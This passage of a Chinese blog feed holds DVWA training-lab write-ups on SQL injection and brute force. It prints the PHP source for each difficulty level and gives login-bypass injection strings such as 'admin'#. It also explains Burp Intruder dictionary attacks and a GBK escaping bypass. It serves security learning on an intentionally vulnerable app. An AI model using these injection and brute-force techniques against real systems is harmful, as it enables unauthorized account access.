src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074544735.png" alt></p><p><strong>源码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_REQUEST[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_REQUEST[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[&quot;first_name&quot;];</span><br><span class="line">$last = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>没有任何过滤，最基本的SQL注入</p><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>变成了下拉框</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074705950.png" alt></p><p>可以查看元素知道<code>name=id，post</code>表单，可以用burp抓包改id或者用<code>hackbar</code>。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074726997.png" alt></p><p><code>id=1&#39;</code>发现单引号被转义了</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074740092.png" alt></p><p><code>id=1 or 1=1&amp;Submit=Submit</code>显示所有ID和姓名，可以判断是数字型。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074820589.png" alt></p><p>其余方法和LOW难度一样</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074754426.png" alt></p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_POST[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_POST[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">$id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id);</span><br><span class="line"></span><br><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &apos;&lt;pre&gt;&apos; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">// Display values</span><br><span class="line">$first = $row[&quot;first_name&quot;];</span><br><span class="line">$last = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// This is used later on in the index.php page</span><br><span class="line">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span><br><span class="line">$query = &quot;SELECT COUNT(*) FROM users;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[0];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>与LOW相比仅仅加了一个<code>mysqli_real_escape_string</code>函数转义<code>\x00，\n，\r，\，&#39;，&quot;，\x1a</code>。单引号闭合变成了数字型。</p><h2 id="High难度"><a href="#High难度" class="headerlink" title="High难度"></a>High难度</h2><p>变成了在另外一个窗口提交ID到该页面</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074936478.png" alt></p><p>其余步骤和上面差不多</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（三）SQL-Injection/20190326074945284.png" alt></p><p>High级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p><p><strong>源码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if( isset( $_SESSION [ &apos;id&apos; ] ) ) &#123;</span><br><span class="line">// Get input</span><br><span class="line">$id = $_SESSION[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Check database</span><br><span class="line">$query = &quot;SELECT first_name, last_name FROM users WHERE user_id = &apos;$id&apos; LIMIT 1;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">// Get results</span><br><span class="line">while( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[&quot;first_name&quot;];</span><br><span class="line">$last = $row[&quot;last_name&quot;];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>与Medium难度相比High难度没有转义函数，在SQL语句后面添加了一个limit，限制输出结果为1条。虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。安全代码 Impossible难度</p><p><strong>源码：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123;</span><br><span class="line">// Check Anti-CSRF token</span><br><span class="line">checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );</span><br><span class="line"></span><br><span class="line">// Get input</span><br><span class="line">$id = $_GET[ &apos;id&apos; ];</span><br><span class="line"></span><br><span class="line">// Was a number entered?</span><br><span class="line">if(is_numeric( $id )) &#123;</span><br><span class="line">// Check the database</span><br><span class="line">$data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; );</span><br><span class="line">$data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT );</span><br><span class="line">$data-&gt;execute();</span><br><span class="line">$row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">// Make sure only 1 result is returned</span><br><span class="line">if( $data-&gt;rowCount() == 1 ) &#123;</span><br><span class="line">// Get values</span><br><span class="line">$first = $row[ &apos;first_name&apos; ];</span><br><span class="line">$last = $row[ &apos;last_name&apos; ];</span><br><span class="line"></span><br><span class="line">// Feedback for end user</span><br><span class="line">echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Generate Anti-CSRF token</span><br><span class="line">generateSessionToken();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>添加了token机制，防止CSRF攻击。<br>SQL语句使用<br><a href="https://link.jianshu.com/?t=http://www.runoob.com/php/php-pdo.html" target="_blank" rel="noopener">PDO机制预处理语句</a><br><a href="https://link.jianshu.com/?t=http://192.168.86.128/DVWA-master/vulnerabilities/sqli/" target="_blank" rel="noopener">PHP PDO 预处理语句与存储过程</a></p><p>原理：两次传输，前一次传一个sql模板，第二次传查询参数，会把第二步传入的参数只做查询参数处理，不做语义解释，这样注入的条件就算执行了，也不会得到查询结果。<br>划清了代码与数据的界限，可以确保不会发生SQL 注入。（然而，如果查询的其他部分是由未转义的输入来构建的，则仍存在 SQL 注入的风险）。</p><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;DVWA学习（三）SQL Injection&lt;br&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://archimesan.me/categories/CTF/"/>
    
      <category term="DVWA" scheme="http://archimesan.me/categories/CTF/DVWA/"/>
    
    
      <category term="DVWA" scheme="http://archimesan.me/tags/DVWA/"/>
    
  </entry>
  
  <entry>
    <title>DVWA学习（二）Brute Force</title>
    <link href="http://archimesan.me/2018/05/06/DVWA%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89Brute-Force/"/>
    <id>http://archimesan.me/2018/05/06/DVWA学习（二）Brute-Force/</id>
    <published>2018-05-06T11:15:26.000Z</published>
    <updated>2019-03-26T15:18:40.371Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>DVWA学习（二）Brute Force（暴力破解模块）<br><a id="more"></a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>暴力破解一般指穷举法，穷举法的基本思想是根据题目的部分条件确定答案的大致范围，并在此范围内对所有可能的情况逐一验证，直到全部情况验证完毕。若某个情况验证符合题目的全部条件，则为本问题的一个解；若全部情况验证后都不符合题目的全部条件，则本题无解。穷举法也称为枚举法。</p><h1 id="Burp-Intruder模块"><a href="#Burp-Intruder模块" class="headerlink" title="Burp Intruder模块"></a>Burp Intruder模块</h1><p>1.Burp Intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击，Burp Intruder 是高度可配置的，并被用来在广范围内进行自动化攻击。</p><p>原理：Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会携带一个或多个有效攻击载荷（Payload),在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景：</p><p>●标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如，用户名，文件ID和账户号码。<br>●提取有用的数据 在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。<br>●模糊测试 很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。</p><p>2.Burp Intruder主要有四个模块组成:</p><p>●：Target 用于配置目标服务器进行攻击的详细信息。<br>●：Positions 设置Payloads的插入点以及攻击类型（攻击模式）。<br>●：Payloads 设置payload，配置字典<br>●：Opetions 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。</p><p><strong>Target 目标选项(Target tab)</strong></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326071837707.png" alt></p><p><strong>Positions 位置选项(Positions tab)</strong></p><p>这个选项是用来配置在攻击里产生的所有 HTTP 请求的模板：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072033918.png" alt></p><p><a href="https://blog.csdn.net/huilan_same/article/details/64440284" target="_blank" rel="noopener">Burp Suite Intruder的4种攻击类型</a></p><p><strong>Payloads 有效负荷选项(Payloads tab)</strong></p><p>选项1：Payload Sets Payload数量类型设置</p><p>选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072404904.png" alt></p><p>选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072436744.png" alt></p><p>选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072501647.png" alt></p><p><strong>Opetions 选项卡(Options tab)</strong></p><p>选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072532239.png" alt></p><p>如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。</p><p>如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。</p><p>选项2：Request Engine 设置发送请求的线程、超时重试等。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072629561.png" alt></p><p>选项3：Attack Results 设置攻击结果的显示。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072640144.png" alt></p><p>选项4：Grep - Match Grep Match——这个设置主要用来从响应消息中提取结果项，如果匹配，则在攻击结果中添加的新列中标明，便于排序和数据提取。比如说，在密码猜测攻击，扫描诸如“密码不正确”或“登录成功”，可以找到成功的登录;在测试SQL注入漏洞，扫描包含“ODBC”，“错误”等消息可以识别脆弱的参数</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072820654.png" alt></p><p>选项5：Grep Extract——这些设置可用于提取响应消息中的有用信息。对于列表中配置的每个项目，Burp会增加包含提取该项目的文本的新结果列。然后，您可以排序此列（通过单击列标题）命令所提取的数据。此选项是从应用数据挖掘有用的，能够支持广泛的攻击。例如，如果你是通过一系列文档ID的循环，可以提取每个文档寻找有趣的项目的页面标题。如果您发现返回的其他应用程序用户详细信息的功能，可以通过用户ID重复和检索有关用户寻找管理帐户，甚至密码。如果“遗忘密码”的功能需要一个用户名作为参数，并返回一个用户配置的密码提示，您可以通过共同的用户名列表运行和收获的所有相关密码的提示，然后直观地浏览列表寻找容易被猜到密码。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072842898.png" alt></p><p>选项6：Grep Payloads——这些设置可用于提取响应消息中是否包含Payload的值，比如说，你想验证反射性的XSS脚本是否成功，可以通过此设置此项。当此项设置后，会在响应的结果列表中，根据Payload组的数目，添加新的列，显示匹配的结果，你可以通过点击列标题对结果集进行排序和查找。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072928707.png" alt></p><p>选项7：Redirections 重定向响应，重定向（Redirections）——这些设置主要是用来控制执行攻击时Burp如何处理重定向，在实际使用中往往是必须遵循重定向，才能实现你的攻击目的。例如，在密码猜测攻击，每次尝试的结果可能是密码错误会重定向响应到一个错误消息提示页面，如果密码正确会重定向到用户中心的首页。 但设置了重定向也可能会遇到其他的问题，比如说，在某些情况下，应用程序存储您的会话中初始请求的结果，并提供重定向响应时检索此值，这时可能有必要在重定向时只使用一个单线程攻击。也可能会遇到，当你设置重定向，应用程序响应会重定向到注销页面，这时候，按照重定向可能会导致您的会话被终止时.</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326072938164.png" alt></p><p>参考：<a href="https://link.jianshu.com/?t=https://blog.csdn.net/u011781521/article/details/54772795" target="_blank" rel="noopener">BurpSuite系列(五)—-Intruder模块(暴力破解)</a></p><h1 id="Brute-Force（暴力破解）"><a href="#Brute-Force（暴力破解）" class="headerlink" title="Brute Force（暴力破解）"></a>Brute Force（暴力破解）</h1><h2 id="LOW等级"><a href="#LOW等级" class="headerlink" title="LOW等级"></a>LOW等级</h2><p>查看源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Login&apos; ] ) ) &#123;</span><br><span class="line">// Get username</span><br><span class="line">$user = $_GET[ &apos;username&apos; ];</span><br><span class="line"></span><br><span class="line">// Get password</span><br><span class="line">$pass = $_GET[ &apos;password&apos; ];</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">// Check the database</span><br><span class="line">$query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>很明显没有任何过滤，存在SQL注入，因为mysqli_num_rows( $result ) == 1，所以产生的结果数必须为1条,而且密码经过了md5加密，是不可控的，所以只能在username上构造语句:<br>SELECT * FROM ‘users’ WHERE user = ‘1’ or 1=1 limit 0,1#’ AND password = ‘随意填’;</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073409973.png" alt></p><p>当然如果你知道一个用户名为admin的话，也可以构造：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM &apos;users&apos; WHERE user = &apos;admin&apos;#&apos; AND password = &apos;$pass&apos;;</span><br></pre></td></tr></table></figure></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073433422.png" alt></p><p>上面是SQL注入，可是这道题是让暴力破解的，第二种方法：<br>Burp抓包发送到Intruder模块，假设已知管理员用户名admin，需要对password暴破，把password的参数设置为需要破解的变量，只有一个类型使用狙击手模式即可。</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073445949.png" alt></p><p>简单模式，配置字典，也可以加载外部字典</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073457658.png" alt></p><p>也可以设置从响应消息中提取结果</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073508810.png" alt></p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073518119.png" alt></p><p>根据Welcome为对号或者Length不同找到正确的密码</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073529792.png" alt></p><h2 id="Medium等级"><a href="#Medium等级" class="headerlink" title="Medium等级"></a>Medium等级</h2><p>源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_GET[ &apos;Login&apos; ] ) ) &#123;</span><br><span class="line">// Sanitise username input</span><br><span class="line">$user = $_GET[ &apos;username&apos; ];</span><br><span class="line">$user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line"></span><br><span class="line">// Sanitise password input</span><br><span class="line">$pass = $_GET[ &apos;password&apos; ];</span><br><span class="line">$pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));</span><br><span class="line">$pass = md5( $pass );</span><br><span class="line"></span><br><span class="line">// Check the database</span><br><span class="line">$query = &quot;SELECT * FROM `users` WHERE user = &apos;$user&apos; AND password = &apos;$pass&apos;;&quot;;</span><br><span class="line">$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &apos;&lt;pre&gt;&apos; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &apos;&lt;/pre&gt;&apos; );</span><br><span class="line"></span><br><span class="line">if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123;</span><br><span class="line">// Get users details</span><br><span class="line">$row = mysqli_fetch_assoc( $result );</span><br><span class="line">$avatar = $row[&quot;avatar&quot;];</span><br><span class="line"></span><br><span class="line">// Login successful</span><br><span class="line">echo &quot;&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">// Login failed</span><br><span class="line">sleep( 2 );</span><br><span class="line">echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>跟LOW相比，username和password经过了mysqli_real_escape_string()函数过滤，这个函数会对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，MySQL5.5.37以下版本如果设置编码为GBK，能够构造编码绕过mysql_real_escape_string 对单引号的转义，实验环境为MySQL5.7.21，所以无法进行SQL注入。<br>以及如果密码错误的话会sleep( 2 )，每一次的请求包响应时间由毫秒基本变成了2~10秒。这样大大的增加了我们破解出密码锁需要的时间。步骤与LOW模式一致。<br>这里就当作不知道用户名和密码，添加两个字典用集束炸弹模式用笛卡儿积的方式同时暴破两个参数：</p><p><img src="http://poysl5u4h.bkt.clouddn.com/DVWA学习（二）Brute-Force/20190326073600338.png" alt></p><p>设置payload1，2对应的用户名密码字典</p><p><img 